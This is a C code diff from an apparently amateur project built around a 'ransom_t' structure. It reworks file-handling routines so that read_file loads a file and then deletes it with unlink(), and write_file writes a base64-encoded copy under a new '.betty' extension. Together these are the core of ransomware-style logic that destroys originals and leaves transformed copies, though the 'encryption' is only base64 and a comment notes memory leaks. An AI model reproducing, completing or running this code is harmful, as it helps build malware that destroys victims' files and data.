@@ -11,7 +11,7 @@
   * @fxn: pointer to function to enact on lines
   * Return: number of bytes read
  **/
-size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *ransom))
+char *read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *ransom))
 {
 	/*
 	int read = 0;
@@ -37,27 +37,11 @@ printf("filesize: %d\n", (int)bytes_read);
 	fread(buf, bytes_read, sizeof(char), fd);
 	buf[bytes_read] = '\0';
 printf("orig: %s\n", buf);
-getchar();
 	if(fxn)
 		fxn(buf, ransom);
-	/*
-	printf("base64: %s\n", base64encode(buf, read));
-	while((read = getline(&buf, &bytes_read, fd)) > 0)
-	{
-		printf("%s", buf);
-		if (fxn && read > 2)
-		{
-			buf[read] = '\0';
-			fxn(buf, ransom);
-		}
-		else
-			printf("base64: %s\n", base64encode(buf, read));
-	}
-	*/
-	free(buf);
 	fclose(fd);
-	/* unlink(filepath); */
-	return (bytes_read);
+	unlink(filepath);
+	return (buf);
 }
 
 /**
@@ -69,23 +53,40 @@ getchar();
 size_t write_file(node_t *node, char *buffer)
 {
 	unsigned int new_ext_len = 0;
+	size_t buf_size = 0;
 	size_t bytes_written = 0;
 	char *new_ext = ".betty";
+	char *encrypt_buf = NULL;
 	FILE *fd = NULL;
+	/*
 	struct stat file_info;
 
-
 	stat(node->str, &file_info);
-	new_ext_len = my_strlen(new_ext);
-	node->str = recalloc(node->str, node->len, node->len + new_ext_len+ 1);
-	my_strncat(node->str, new_ext, node->len, new_ext_len);
-	buffer++;
-
-	chmod(node->str, file_info.st_mode);
-	fd = fopen(node->str, "wb+");
-	/*
-	bytes_written = fwrite((const char *)buffer, size, sizeof(char), fd);
 	*/
+	new_ext_len = my_strlen(new_ext);
+	node->str = recalloc(node->str, node->len, node->len + new_ext_len + 1);
+	my_strncat(node->str, new_ext, node->len, new_ext_len);
+	/* Open FD */
+	fd = fopen(node->str, "wb+");
+
+	buf_size = my_strlen(buffer);
+/* TODO: base64encode function causes massive memory leaks */
+	encrypt_buf = base64encode((const void *)buffer, buf_size);
+	/**
+	  * Print for debugging
+	  * printf("ENCODED:\n\n%s\n", encrypt_buf);
+	  * getchar();
+	 **/
+
+	if ((bytes_written = fwrite((const char *)encrypt_buf, buf_size, sizeof(char), fd)) < 1)
+		fprintf(stderr, "No bytes written\n");
+
+	free(encrypt_buf);
+
 	fclose(fd);
+	/* Close FD */
+	/*
+	chmod(node->str, file_info.st_mode);
+	*/
 	return(bytes_written);
 }
